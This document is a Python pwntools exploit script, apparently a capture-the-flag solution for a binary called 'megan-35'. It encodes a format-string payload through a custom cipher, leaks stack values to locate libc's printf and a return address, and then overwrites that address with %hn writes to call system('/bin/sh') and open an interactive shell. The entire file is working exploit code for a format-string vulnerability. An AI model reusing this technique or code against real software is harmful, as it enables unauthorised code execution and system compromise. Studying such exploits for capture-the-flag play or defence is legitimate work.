#!/usr/bin/env python

from pwn import *
from WeirdEncodings import megan35
from WeirdEncodings import encode as weird_encode
from WeirdEncodings import decode as weird_decode
from WeirdEncodings import b as base 

context.clear(arch='i386', os='linux', log_level='DEBUG')

libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def getp():
	p=process("./megan-35")
	p.recvuntil("encryption.\n")
	return p

def find_arg_offset():
	for i in range(0,500):
		p=getp()
		payload='AAAA%'
		payload+=str(i)
		payload+="$x"
		cipher=weird_encode(megan35,payload)
		p.sendline(cipher)
		ret=p.recvall()
		print(ret)

		if '41414141' in ret:
			print i
			print "Found it!"
			return i

		
def get_printf_addr():
	p=getp()
	payload=''
	payload="AAAA%46$x"
	cipher=weird_encode(megan35,payload)
	p.sendline(cipher)
	ret=p.recvall()
	ret=ret.replace('AAAA','')
	return u32(ret.decode('hex')[::-1])+0x3a3af

def get_ret_addr():
	p=getp()
	pid=util.proc.pidof(p)[0]
	#util.proc.wait_for_debugger(pid)	
	payload=''
	payload="AAAA%96$x"
	cipher=weird_encode(megan35,payload)
	p.sendline(cipher)
	ret=p.recvall()
	ret=ret.replace('AAAA','')
	return u32(ret.decode('hex')[::-1])+0xc
	
def main():
	#find_arg_offset()	
	printf=get_printf_addr()
	log.info("{} : {:08x}".format("printf".ljust(20," "),printf))
	ret=get_ret_addr()
	log.info("{} : {:08x}".format("ret".ljust(20," "),ret))
	libc.address=printf-libc.symbols['printf']
	print "System..."	
	print hexdump(libc.symbols['system'])
	print "/bin/sh..."
	print hexdump(next(libc.search('/bin/sh\x00')))
	
	fmt=''
	fmt+=p32(ret)
	fmt+=p32(ret+8)
	fmt+=p32(ret+2)
	fmt+=p32(ret+8+2)
	fmt+='%17152%71$hn'
	fmt+='%10716%72$hn'
	fmt+='%35577%73$hn'
	fmt+='%18%74$hn'
	
	payload=weird_encode(megan35,fmt)
	p=getp()
	pid=util.proc.pidof(p)[0]
	util.proc.wait_for_debugger(pid)	
	p.sendline(payload)
	p.interactive()

if __name__=="__main__":
	main()


